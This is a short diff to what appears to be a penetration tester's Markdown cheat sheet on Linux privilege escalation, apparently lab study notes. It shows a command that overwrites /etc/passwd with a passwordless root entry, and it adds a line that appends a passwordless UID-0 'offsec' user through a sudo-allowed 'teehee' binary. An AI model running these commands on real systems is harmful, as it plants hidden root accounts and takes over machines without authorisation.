@@ -188,7 +188,8 @@ overwrite /etc/passwd to gain root access
 ```
 echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
 ```
-
+echo "offsec::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
+#teehee is set up in sudoers and run as root:all
 
 # ltrace
 ltrace to find were a program makes system calls:
